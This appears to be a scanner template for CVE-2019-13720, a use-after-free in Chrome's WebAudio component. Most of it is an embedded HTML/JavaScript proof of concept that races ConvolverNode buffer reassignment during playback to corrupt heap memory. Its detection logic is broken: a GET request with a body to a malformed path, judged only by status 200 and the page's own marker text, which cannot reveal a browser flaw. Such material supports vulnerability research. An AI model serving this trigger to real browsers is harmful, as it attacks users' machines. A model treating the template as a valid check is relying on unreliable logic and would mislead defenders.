[info]
author = "AVE"
description = "检测 Google Chrome 78.0.3904.87 之前版本 WebAudio 组件中的释放后使用漏洞。通过特制 HTML 页面触发 ConvolverNode 的并发访问竞争条件，导致堆内存破坏。参考 Kaspersky 原始 PoC 及 Project Zero 分析。"
id = "POC-AVE-2019-0520"
name = "Google Chrome WebAudio Use-After-Free PoC"
severity = "high"
tags = [
    "cve-2019-13720",
    "chrome",
    "uaf",
    "webaudio",
]
vuln_id = [
    "CVE-2019-13720",
    "AVE-2019-0520",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc.html"
protocol = "http"

[poc.requests.body]
content = """
<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<script>
var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
var convolver = audioCtx.createConvolver();
var buffer = audioCtx.createBuffer(2, 22050, audioCtx.sampleRate);
convolver.buffer = buffer;
var src = audioCtx.createBufferSource();
src.buffer = audioCtx.createBuffer(2, 22050, audioCtx.sampleRate);
src.connect(convolver);
convolver.connect(audioCtx.destination);
src.start();
audioCtx.suspend().then(function() {
  audioCtx.resume().then(function() {
    for (var i = 0; i < 100; i++) {
      convolver.buffer = null;
      convolver.buffer = buffer;
    }
  });
});
</script>
<p>CVE-2019-13720 PoC</p>
</body>
</html>"""
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["CVE-2019-13720 PoC"]
